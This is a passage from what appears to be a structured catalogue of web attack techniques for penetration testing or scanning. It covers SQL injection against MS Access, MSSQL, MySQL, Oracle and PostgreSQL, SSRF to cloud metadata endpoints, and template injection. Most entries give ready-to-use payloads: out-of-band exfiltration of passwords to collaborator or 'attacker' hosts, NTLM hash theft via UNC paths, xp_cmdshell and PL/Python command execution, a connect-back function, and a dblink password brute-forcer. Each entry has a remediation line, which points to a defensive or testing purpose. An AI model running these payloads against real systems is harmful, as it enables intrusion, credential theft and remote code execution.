description: Attackers can use IIF with Mid and LAST to perform boolean-based data exfiltration by triggering different HTTP responses.
payload_templates: IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
remediation: Use parameterized queries and input validation.

title: MS Access SQLi time-based blind via UNC path delay
description: Jet/ACE does not support SLEEP but delays can be introduced by forcing access to a slow or non-responsive UNC path, creating a timing oracle.
remediation: Block outbound SMB/WebDAV and set registry to disable remote tables.

title: MS Access SQLi via UNC path for NTLM credential theft
description: Attackers can inject UNC paths into IN clauses to force the MS Access engine to authenticate to attacker-controlled SMB/HTTP servers, leaking NTLM hashes.
payload_templates: 1' UNION SELECT TOP 1 name FROM MSysObjects IN '\\attacker\share\poc.mdb'-- -
remediation: Set registry key AllowQueryRemoteTables=0 and block outbound SMB/WebDAV.

title: MS Access SQLi to disclose web root directory path
description: Error messages from MS Access may reveal the web root absolute path when querying non-existent databases.
remediation: Suppress detailed error messages in production.

title: MS Access SQLi for remote file existence enumeration
description: Attackers can infer file existence on the filesystem by querying a file path in an IN clause, which triggers specific error messages if the file exists.
remediation: Block outbound SMB/WebDAV and sanitize IN clause inputs.

title: MS Access SQLi for .mdb file name guessing
description: Attackers can guess .mdb filenames by injecting them into UNION queries and observing error messages to distinguish valid from invalid filenames.
remediation: Sanitize inputs and suppress detailed errors.

title: MSSQL Active Directory Enumeration via SQL Injection
description: Enumerate domain users and SIDs via MSSQL functions like SUSER_SID and SUSER_SNAME when SQL injection is present. Exploits type conversion and string concatenation to extract domain information.
remediation: Sanitize user inputs, use parameterized queries, and restrict database permissions.

title: MSSQL Error-Based SQL Injection via Type Conversion
description: Trigger data type conversion errors to bypass WAFs and extract database information using functions like USER_NAME() or PERMISSIONS(). Uses string concatenation with %2b to evade filters.
payload_templates: 1%2b(select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
remediation: Use parameterized queries, disable detailed error messages, and apply WAF rules to block suspicious patterns.

title: MSSQL SSRF via fn_xe_file_target_read_file
description: Abuse the fn_xe_file_target_read_file function to perform SSRF and exfiltrate data via UNC paths when VIEW SERVER STATE permission is granted.
payload_templates: 1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\'%2b(select pass from users where id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
remediation: Restrict VIEW SERVER STATE permission, disable unnecessary extended stored procedures, and monitor network requests from the database.

title: MSSQL SSRF via fn_get_audit_file
description: Exploit fn_get_audit_file to perform SSRF and exfiltrate data via UNC paths when CONTROL SERVER permission is granted.
payload_templates: 1%2b(select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
remediation: Restrict CONTROL SERVER permission, disable unnecessary extended stored procedures, and block outbound SMB traffic from the database server.

title: MSSQL SSRF via fn_trace_gettable
description: Use fn_trace_gettable to perform SSRF and exfiltrate data via UNC paths when CONTROL SERVER permission is granted.
payload_templates: 1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
remediation: Restrict CONTROL SERVER permission, disable trace functions, and block outbound SMB traffic.

title: MSSQL SSRF via xp_dirtree and Related Procedures
description: Abuse xp_dirtree, xp_fileexists, or xp_subdirs to perform limited SSRF by triggering network requests to SMB shares (port 445) when appropriate permissions are available.
remediation: Disable undocumented extended stored procedures, restrict permissions, and block outbound SMB traffic.

title: MSSQL Remote Code Execution via xp_cmdshell
description: Execute arbitrary OS commands via xp_cmdshell when enabled and accessible through SQL injection. Requires sysadmin privileges to enable.
payload_templates: admin' exec('sp_configure ''show advanced option'',''1'' reconfigure') exec('sp_configure ''xp_cmdshell'',''1'' reconfigure')--
remediation: Disable xp_cmdshell by default, restrict sysadmin privileges, and monitor for unauthorized procedure enabling.

title: MSSQL CLR User-Defined Function for HTTP Requests
description: Create a CLR UDF (e.g., SQLHttp) to perform HTTP requests from within MSSQL, enabling data exfiltration or SSRF when dbo or sysadmin access is available.
remediation: Disable CLR integration, restrict assembly creation permissions, and audit trusted assemblies.

title: MSSQL Data Exfiltration via FOR JSON Clause
description: Extract entire table contents in a single query using FOR JSON AUTO to bypass traditional UNION-based techniques and evade detection.
payload_templates: -1' union select null,concat_ws(0x3a,table_schema,table_name,column_name),null from information_schema.columns for json auto--
1' and 1=(select concat_ws(0x3a,table_schema,table_name,column_name)a from information_schema.columns for json auto)--
remediation: Sanitize inputs, use parameterized queries, and restrict information_schema access.

title: MSSQL Query Retrieval via DMVs
description: Retrieve currently executing SQL queries from sys.dm_exec_requests and sys.dm_exec_sql_text when VIEW SERVER STATE permission is available.
payload_templates: -1 union select null,(select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)),null,null
remediation: Restrict VIEW SERVER STATE permission and monitor DMV access.

title: MSSQL WAF Bypass Techniques
description: Bypass WAFs using non-standard whitespace (%C2%85, %C2%A0), scientific notation (0e), hex notation (0x), or unorthodox stacked queries without semicolons.
remediation: Implement robust WAF rules covering non-standard whitespace, stacked queries, and scientific notation obfuscation.

title: Classic SQL Injection in MySQL
description: MySQL injection via untrusted input concatenated into SQL queries. Allows data exfiltration, command execution, or authentication bypass depending on privileges.
payload_templates: 1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
remediation: Use parameterized queries/prepared statements with strict type binding.

title: SSRF via MySQL Injection
description: Abuse MySQL functions like LOAD_FILE or INTO OUTFILE to trigger outbound HTTP requests or access internal services.
remediation: Disable dangerous functions, restrict network access, and sanitize inputs.

title: Boolean Mode Full-Text Search Injection
description: Abuse MySQL MATCH() AGAINST() BOOLEAN MODE to inject operators and create a Boolean oracle for data exfiltration without breaking syntax.
remediation: Sanitize input by stripping Boolean operators and enforce strict allow-lists.

title: Error-Based Exfiltration via updatexml()
description: Leak data through MySQL XPATH errors by embedding values in updatexml() calls when only error messages are returned.
payload_templates: updatexml(null, concat(0x7e, IFNULL((SELECT name FROM project_state LIMIT 1 OFFSET 0), 'NULL'), 0x7e, '///'), null)
remediation: Avoid exposing raw SQL errors; use generic error messages.

title: WAF Bypass via Prepared Statements
description: Bypass WAFs by encoding malicious queries as hex, assigning to variables, and executing via PREPARE/EXECUTE in MySQL.
payload_templates: 0); SET @query = 0x53454c45435420534c454550283129; PREPARE stmt FROM @query; EXECUTE stmt; #
remediation: Use strict input validation and disable dynamic SQL execution.

title: Space Filter Bypass via /**/ Comment Trick
description: Bypass input filters that strip spaces by replacing spaces with /**/ comments, allowing injection in restricted input fields.
remediation: Avoid naive input sanitization; use allow-lists and strict parsing.

title: SSRF via MySQL LOAD_FILE() function
description: MySQL's LOAD_FILE() function can initiate network requests when file access is unrestricted. This is constrained by OS and database startup configurations, particularly the secure_file_priv setting.
remediation: Set secure_file_priv to a restricted directory and disable unnecessary file privileges.

title: RCE via MySQL User Defined Functions (UDF)
description: MySQL UDFs allow loading external libraries to execute OS commands or network requests. Requires write access to plugin directories and file privileges.
payload_templates: CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
remediation: Restrict write access to plugin directories and disable UDF loading unless necessary.

title: Oracle UTL_HTTP SSRF via SQL Injection
description: Abusing the UTL_HTTP package in Oracle SQL/PLSQL to perform server-side HTTP requests, enabling SSRF and exfiltration of internal metadata or cloud provider services.
remediation: Restrict network ACLs for UTL_HTTP and apply principle of least privilege; disable unused Oracle network packages.

title: Oracle UTL_TCP SSRF via SQL Injection
description: Using UTL_TCP to craft raw TCP connections from Oracle SQL/PLSQL, enabling SSRF to internal services and cloud metadata endpoints.
payload_templates: DECLARE c utl_tcp.connection; retval pls_integer; BEGIN c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2); retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0'); ... END;
DECLARE c utl_tcp.connection; BEGIN c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4); ... END;
remediation: Disable UTL_TCP or restrict network ACLs; audit definer-rights procedures for excessive privileges.

title: Oracle DBMS_LDAP SSRF via SQL Injection
description: Exploiting DBMS_LDAP.INIT to trigger outbound LDAP/TCP connections from Oracle SQL, enabling port scanning and SSRF.
payload_templates: SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual
remediation: Restrict DBMS_LDAP access via ACLs; disable unused Oracle network packages.

title: Oracle UTL_SMTP SSRF via SQL Injection
description: Abusing UTL_SMTP.OPEN_CONNECTION to initiate SMTP connections to arbitrary hosts/ports from Oracle SQL, enabling port scanning.
payload_templates: DECLARE c utl_smtp.connection; BEGIN c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2); END;
DECLARE c utl_smtp.connection; BEGIN c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2); END;
oracle_hints: ORA-29278: SMTP transient error: 421 Service not available
remediation: Disable UTL_SMTP or restrict network ACLs; audit usage of email packages.

title: Oracle UTL_INADDR DNS Exfiltration via SQL Injection
description: Using UTL_INADDR.get_host_address to trigger outbound DNS lookups from Oracle SQL, enabling blind data exfiltration.
payload_templates: SELECT UTL_INADDR.get_host_address((SELECT name FROM v$database)||'.'||(SELECT user FROM dual)||'.attacker.oob.server') FROM dual
remediation: Restrict UTL_INADDR access via ACLs; disable unused Oracle network packages.

title: Oracle DBMS_CLOUD.SEND_REQUEST SSRF via SQL Injection
description: Abusing DBMS_CLOUD.SEND_REQUEST in Oracle 19c+ to perform arbitrary HTTP requests from SQL, enabling SSRF and metadata exfiltration.
payload_templates: DECLARE resp DBMS_CLOUD_TYPES.resp; BEGIN resp := DBMS_CLOUD.send_request(credential_name => 'NOAUTH', uri => 'http://169.254.169.254/latest/meta-data/', method => 'GET', timeout => 3); ... END;
remediation: Restrict DBMS_CLOUD access via ACLs; audit definer-rights procedures for excessive privileges.

title: Oracle HTTPURITYPE GETCLOB SSRF via SQL Injection
description: Using HTTPURITYPE('http://...').getclob() to fetch HTTP responses from Oracle SQL, enabling SSRF and metadata exfiltration.
remediation: Restrict HTTPURITYPE access via ACLs; disable unused Oracle network packages.

title: PostgreSQL dblink large object exfiltration
description: Abuse PostgreSQL's dblink module and large objects to exfiltrate database contents via crafted queries. Data is loaded into large objects and then retrieved through dblink_connect username field.
payload_templates: SELECT lo_import('/etc/passwd'); SELECT dblink_connect('host=attacker port=5432 dbname=test user=postgres password=secret');
remediation: Disable dblink extension or restrict its usage to authorized roles.

title: PostgreSQL stacked query time-based injection
description: Abuse PostgreSQL's stacked query support to inject time delays when multiple responses are blocked by the application. Uses pg_sleep() to infer data via timing differences.
payload_templates: 1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
remediation: Use parameterized queries and disable stacked queries in the application.

title: PostgreSQL query_to_xml data exfiltration
description: Use query_to_xml to dump entire database contents into a single XML row, bypassing row limits and enabling large-scale data exfiltration.
remediation: Restrict XML output functions and sanitize query inputs.

title: PostgreSQL hex-encoded query bypass
description: Encode malicious SQL queries in hex and decode them at runtime using convert_from to bypass WAFs and input filters that block quotes or keywords.
payload_templates: select encode('select cast(string_agg(table_name, ',','') as int) from information_schema.tables', 'hex')
remediation: Implement strict input validation and block hex-encoded payloads.

title: PostgreSQL CHR-based string construction bypass
description: Bypass quote restrictions by constructing strings using CHR() function calls, enabling injection in contexts where literal quotes are blocked.
remediation: Use parameterized queries and block CHR() function calls in inputs.

title: PostgreSQL dollar-quoted string bypass
description: Bypass quote restrictions using PostgreSQL's dollar quoting syntax, allowing injection without literal quotes in the payload.
remediation: Use parameterized queries and block dollar-quoted strings in inputs.

title: PostgreSQL dblink privilege escalation via misconfigured pg_hba.conf
description: Misconfigured pg_hba.conf allowing localhost connections as any user without password enables privilege escalation via dblink. Attackers with shell access can abuse dblink to access unauthorized data.
payload_templates: SELECT * FROM dblink('host=127.0.0.1 user=postgres dbname=postgres', 'SELECT datname FROM pg_database') RETURNS (result TEXT);
SELECT * FROM dblink('host=127.0.0.1 user=postgres dbname=postgres', 'select usename, passwd from pg_shadow') RETURNS (result1 TEXT, result2 TEXT);
remediation: Restrict pg_hba.conf to trusted users and disable trust authentication.

title: PostgreSQL dblink port scanning via connection errors
description: Abusing dblink_connect or dblink_connect_u allows port scanning by analyzing connection error responses. Different errors indicate port states (closed, filtered, timeout).
payload_templates: SELECT * FROM dblink_connect('host=216.58.212.238 port=443 user=name password=secret dbname=abc connect_timeout=10');
remediation: Disable dblink extension or restrict its use to authorized users.

title: PostgreSQL UNC path NTLM hash disclosure via COPY
description: Using COPY FROM with UNC paths forces the database server to initiate SMB connections, leaking NTLM hashes to attacker-controlled servers. Can be used with Burp Collaborator for remote detection.
payload_templates: CREATE TABLE test(); COPY test FROM E'\\\\attacker-machine\\footestbar.txt';

CREATE TABLE test(retval text); CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$ DECLARE sqlstring TEXT; DECLARE userval TEXT; BEGIN SELECT INTO userval (SELECT user); sqlstring := E'COPY test(retval) FROM E\'\\\\'||userval||E'.xxxx.burpcollaborator.net\\test.txt\''; EXECUTE sqlstring; END; $$ LANGUAGE plpgsql SECURITY DEFINER; SELECT testfunc();
remediation: Block outbound SMB traffic from database servers and disable COPY FROM with UNC paths.

title: PL/pgSQL-based password brute-forcing via dblink
description: Abuse PL/pgSQL functions with dblink to brute-force database user passwords by iterating through character combinations or wordlists. Requires PL/pgSQL language support and dblink extension.
payload_templates: CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT, username TEXT, dbname TEXT) RETURNS TEXT AS $$ DECLARE word TEXT; BEGIN FOR a IN 65..122 LOOP FOR b IN 65..122 LOOP FOR c IN 65..122 LOOP FOR d IN 65..122 LOOP BEGIN word := chr(a) || chr(b) || chr(c) || chr(d); PERFORM(SELECT * FROM dblink(' host=' || host || ' port=' || port || ' dbname=' || dbname || ' user=' || username || ' password=' || word, 'SELECT 1') RETURNS (i INT)); RETURN word; EXCEPTION WHEN sqlclient_unable_to_establish_sqlconnection THEN -- do nothing END; END LOOP; END LOOP; END LOOP; END LOOP; RETURN NULL; END; $$ LANGUAGE 'plpgsql';
remediation: Revoke PUBLIC USAGE on plpgsql and restrict dblink extension access.

title: PostgreSQL RCE via custom C extension on Linux
description: PostgreSQL allows loading custom C extensions for additional functionality. An attacker with superuser privileges can compile a malicious shared library with a compatible PostgreSQL version, upload it, and execute arbitrary system commands via a crafted CREATE FUNCTION statement.
payload_templates: CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
remediation: Restrict superuser privileges, disable dynamic loading of untrusted libraries, and enforce strict filesystem permissions on PostgreSQL directories.

title: PostgreSQL RCE via custom C extension on Windows
description: On Windows, PostgreSQL can load DLLs that execute arbitrary binaries when referenced via CREATE FUNCTION. An attacker can upload a malicious DLL and trigger execution by calling the function or even by loading the DLL alone via DllMain.
payload_templates: CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
remediation: Disable dynamic loading of untrusted libraries, restrict superuser privileges, and enforce secure DLL loading policies.

title: PostgreSQL RCE via directory traversal in CREATE FUNCTION on newest versions
description: Even in newer PostgreSQL versions that restrict library loading to specific directories, an authenticated superuser can exploit directory traversal in CREATE FUNCTION to write a shared library into the data directory and load it, achieving arbitrary code execution.
payload_templates: create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
remediation: Apply PostgreSQL security patches, restrict superuser privileges, and enforce strict filesystem permissions on PostgreSQL directories.

title: PostgreSQL large object arbitrary file write
description: PostgreSQL large objects can be abused by authenticated superusers to write arbitrary binary files to the filesystem, including within restricted directories like the data directory, enabling subsequent library loading and code execution.
remediation: Restrict superuser access to large object operations and enforce strict filesystem permissions.

title: RCE via untrusted PL/Python in PostgreSQL
description: Abuse untrusted PostgreSQL language extensions (e.g., plpythonu/plpython3u) to execute arbitrary OS commands via Python code execution within the database engine.
payload_templates: CREATE OR REPLACE FUNCTION exec (cmd text) RETURNS VARCHAR(65535) AS $$ import os return os.popen(cmd).read() $$ LANGUAGE 'plpythonu';
CREATE OR REPLACE FUNCTION req3 (url text) RETURNS VARCHAR(65535) AS $$ from urllib import request r = request.urlopen(url) return r.read() $$ LANGUAGE 'plpythonu';
remediation: Remove untrusted language extensions or restrict their use to trusted roles; apply PostgreSQL security patches.

title: Boolean-based blind SQL injection
description: Uses true/false conditions in page responses to infer data without direct output. Relies on differences in HTTP responses to determine if conditions are met.
remediation: Use parameterized queries and prepared statements.

title: Error-based SQL injection
description: Exploits verbose database error messages to extract data or confirm injection. Errors may reveal database structure or data.
remediation: Disable detailed error messages in production and use parameterized queries.

title: UNION-based SQL injection
description: Injects UNION SELECT statements to combine results from another table into the current query output. Requires matching column counts and types.
payload_templates: ' UNION ALL SELECT null,table_name,null FROM information_schema.tables--
remediation: Use parameterized queries and strict input validation.

title: Stacked query SQL injection
description: Appends extra SQL statements separated by a delimiter (e.g., semicolon) to execute arbitrary commands or queries. Often allows full database compromise.
remediation: Use parameterized queries and disable multiple statements in queries.

title: Time-based blind SQL injection
description: Relies on time delays (e.g., SLEEP, WAITFOR) to detect injectable conditions when no direct output is available. Delays confirm successful injection.
remediation: Use parameterized queries and input validation.

title: Inline/Out-of-band SQL injection
description: Utilizes functions like LOAD_FILE() or DNS exfiltration to extract data via external channels when direct output is not possible.
payload_templates: '; SELECT DNS_LOOKUP(CONCAT('malicious.',(SELECT password FROM users LIMIT 1)))--
remediation: Use parameterized queries and restrict database functions.

title: Second-order SQL injection
description: Injects malicious payloads that are stored and later executed in a different context or request. Often involves storing payloads in databases or logs.
payload_templates: '; UPDATE users SET password='injected_hash' WHERE id=1--
remediation: Sanitize all inputs and use parameterized queries consistently.

title: Second-Order SQL Injection
description: A second-order SQL injection occurs when user input containing malicious SQL is stored in the database and later executed in a different context. SQLMap automates exploitation by injecting payloads in one request and triggering execution in another.
remediation: Use parameterized queries or prepared statements to separate SQL code from data.

title: Boolean-based blind SQL injection
description: Injects true/false conditions to infer data from database responses without direct output. Relies on differences in application behavior between true and false conditions.
remediation: Use parameterized queries or prepared statements with strict input validation.

title: Error-based SQL injection
description: Exploits verbose database error messages to extract data or database structure. Works when error messages are displayed to users.
remediation: Disable detailed error messages in production and use proper exception handling.

title: UNION-based SQL injection
description: Injects UNION SELECT statements to combine results from the original query with attacker-controlled data in the same response channel.
payload_templates: ' UNION ALL SELECT username, password FROM users --
remediation: Use parameterized queries and validate all user inputs strictly.

title: Stacked query SQL injection
description: Injects additional SQL statements separated by semicolons to execute multiple commands in a single request.
remediation: Use stored procedures with strict parameter validation and disable multiple statements in queries.

title: Time-based blind SQL injection
description: Injects delays using database functions like SLEEP or WAITFOR to detect injection when no other output is available.
remediation: Implement strict input validation and use parameterized queries.

title: Out-of-band SQL injection
description: Uses database functions like LOAD_FILE or DNS exfiltration to send data to external servers when direct responses are blocked.
remediation: Restrict database functions that can make external connections and implement network egress controls.

title: Second-order SQL injection
description: Injects malicious payloads that are stored and later executed when data is reused in a different context or request.
remediation: Validate all stored data before reuse and use parameterized queries for all database interactions.

title: SSRF via Open Redirect
description: Exploits an open redirect vulnerability to bypass SSRF restrictions by making the server follow a malicious redirect to an internal resource.
remediation: Validate and sanitize redirect URLs, avoid open redirects.

title: SSRF via file:// protocol
description: Abuses the file:// protocol to access local files on the server, such as /etc/passwd.
remediation: Disable file:// protocol handling in SSRF-prone functions.

title: SSRF via dict:// protocol
description: Uses the DICT protocol to connect to a dictionary server, potentially leaking sensitive data or enabling further attacks.
remediation: Block or restrict dict:// protocol in SSRF-prone functions.

title: SSRF via SFTP:// protocol
description: Exploits the SFTP protocol to connect to an attacker-controlled SFTP server, potentially enabling data exfiltration or command execution.
remediation: Disable or restrict SFTP protocol in SSRF-prone functions.

title: SSRF via TFTP:// protocol
description: Uses the TFTP protocol to send requests to a TFTP server, potentially enabling file retrieval or DoS.
remediation: Block or restrict TFTP protocol in SSRF-prone functions.

title: SSRF via LDAP:// protocol
description: Abuses the LDAP protocol to interact with an LDAP server, potentially leaking directory information or enabling further attacks.
remediation: Disable or restrict LDAP protocol in SSRF-prone functions.

title: SSRF via SMTP protocol
description: Exploits the SMTP protocol to interact with a local mail server, potentially revealing internal domain names or enabling spam.
remediation: Block or restrict SMTP protocol in SSRF-prone functions.

title: SSRF via curl URL globbing
description: Uses curl's URL globbing feature to bypass WAFs and achieve path traversal via the file protocol.
remediation: Disable URL globbing in curl or sanitize inputs.

title: SSRF via Gopher:// protocol
description: Uses the Gopher protocol to send arbitrary TCP requests to any service, enabling full control over the payload and interaction with internal services.
remediation: Disable or restrict Gopher protocol in SSRF-prone functions.

title: SSRF via Gopher to MongoDB
description: Uses Gopher protocol to send crafted MongoDB protocol messages to create an admin user via SSRF.
remediation: Disable Gopher protocol or restrict MongoDB access.

title: SSRF via Referer header
description: Exploits analytics software that processes the Referer header by making it fetch external URLs, enabling SSRF.
remediation: Disable automatic Referer header processing or sanitize URLs.

title: SSRF via SNI data in TLS
description: Exploits a misconfigured Nginx proxy that uses the SNI field as the backend address, allowing SSRF by specifying an internal host in the SNI.
remediation: Sanitize SNI field or disable dynamic backend resolution.

title: SSRF via Java AIA CA Issuers
description: Java mTLS services with AIA CA Issuers enabled dereference attacker-controlled URIs from client certificates during handshake, causing SSRF before HTTP logic.
remediation: Disable AIA CA Issuers fetching or validate client certificates.

title: SSRF via LESS @import
description: Exploits LESS CSS pre-processor's @import directive to fetch external resources during compilation, enabling SSRF.
remediation: Disable remote @import or sanitize CSS imports.

title: SSRF with Command Injection
description: Combines SSRF with command injection by appending shell commands to a URL parameter, leading to remote code execution.
remediation: Sanitize inputs and avoid shell command execution.

title: SSRF via PDF rendering with JS
description: Injects JavaScript into PDF content that is rendered server-side, enabling SSRF or XSS during PDF generation.
remediation: Sanitize user input in PDF generation.

title: SSRF via redirect to Gopher
description: Uses a redirect response to force the client to send a request using the Gopher protocol, enabling further exploitation.
remediation: Avoid open redirects and restrict protocol usage in redirects.

title: SSRF in AWS EC2 via IMDSv1/IMDSv2
description: Server-Side Request Forgery (SSRF) in AWS EC2 allows access to the instance metadata service at 169.254.169.254. IMDSv1 is easily exploitable via GET requests, while IMDSv2 requires a token obtained via PUT request with specific headers, making it harder to abuse.
remediation: Enforce IMDSv2, block access to metadata endpoint from untrusted networks, and restrict IAM roles with minimal permissions.

title: SSRF in AWS ECS via container credentials endpoint
description: SSRF in AWS ECS allows access to container credentials via the endpoint http://169.254.170.2/v2/credentials/<GUID>. The GUID can be obtained via Path Traversal on /proc/self/environ to read AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.
oracle_hints: access key, secret key, and token returned
remediation: Restrict access to metadata endpoints, enforce least privilege IAM roles, and avoid exposing environment variables.

title: SSRF in AWS EKS via Pod Identity credentials
description: SSRF/LFI in AWS EKS pods allows access to Pod Identity credentials by reading environment variables or projected service account token files, then querying the local credential endpoint with the authorization token.
remediation: Restrict access to metadata endpoints, enforce least privilege IAM roles, and avoid exposing environment variables or token files.

title: SSRF in AWS Lambda via environment variables and runtime interface
description: SSRF in AWS Lambda allows access to IAM credentials via environment variables (e.g., AWS_SESSION_TOKEN) by reading /proc/self/environ or via the runtime interface at http://localhost:9001/2018-06-01/runtime/invocation/next for event data.
remediation: Restrict access to environment variables, avoid printing sensitive data in stack traces, and enforce least privilege IAM roles.

title: SSRF in AWS Elastic Beanstalk via instance metadata
description: SSRF in AWS Elastic Beanstalk allows access to instance metadata endpoints to retrieve IAM credentials for the aws-elasticbeanstalk-ec2-role, enabling further AWS resource access.
oracle_hints: access key, secret key, and token returned
remediation: Enforce IMDSv2, block access to metadata endpoint from untrusted networks, and restrict IAM roles with minimal permissions.

title: SSRF in GCP via metadata endpoint
description: SSRF in GCP allows access to the metadata endpoint at 169.254.169.254, metadata.google.internal, or metadata with the required header Metadata-Flavor: Google to extract project and instance metadata.
oracle_hints: project ID and numeric ID returned
remediation: Restrict access to metadata endpoints, enforce least privilege IAM roles, and avoid exposing metadata to untrusted networks.

title: Blind SSRF via platform-specific features
description: Certain platforms expose internal services or metadata endpoints that can be abused for blind SSRF when attacker-controlled input is used to fetch remote resources. This may lead to internal network enumeration or cloud metadata exfiltration.
remediation: Block internal IP ranges and metadata endpoints; use allowlists for outbound requests.

title: IP address format bypass for SSRF
description: Exploits variations in IP address parsing to bypass SSRF allowlists by using decimal, octal, hexadecimal, CIDR, or mixed encodings to represent localhost or internal IPs.
remediation: Normalize IP addresses to standard dotted-decimal format before validation and block non-standard encodings.

title: Jinja2 Server-Side Template Injection
description: Server-Side Template Injection in Jinja2 templates when user input is directly rendered without sanitization. Attackers can inject template expressions to execute arbitrary code on the server.
remediation: Use context-aware escaping and validate/sanitize all user input before rendering in templates.

title: Java Server-Side Template Injection
description: SSTI in Java-based template engines allowing code execution via template expression injection. Exploitable via expressions like ${7*7} or ${T(java.lang.Runtime).getRuntime().exec('id')}.
remediation: Sanitize user input, use safe template engines, and restrict template expression evaluation.

title: FreeMarker Server-Side Template Injection
description: SSTI in FreeMarker template engine enabling remote code execution via expressions like <#assign ex = 'freemarker.template.utility.Execute'?new()>${ ex('id')}.
remediation: Disable dangerous built-ins, use sandboxed environments, and sanitize user input.

title: Velocity Server-Side Template Injection
description: SSTI in Velocity template engine allowing code execution via expressions like #set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('whoami')).
remediation: Restrict template engine capabilities, disable unsafe methods, and sanitize inputs.

title: Thymeleaf Server-Side Template Injection
description: SSTI in Thymeleaf when dynamic templates are generated from user input. Exploitable via expressions like [[${T(java.lang.Runtime).getRuntime().exec('calc')}]] in specific attributes.
remediation: Avoid dynamic template generation from user input; use predefined templates.

title: SpEL (Spring Expression Language) Remote Code Execution
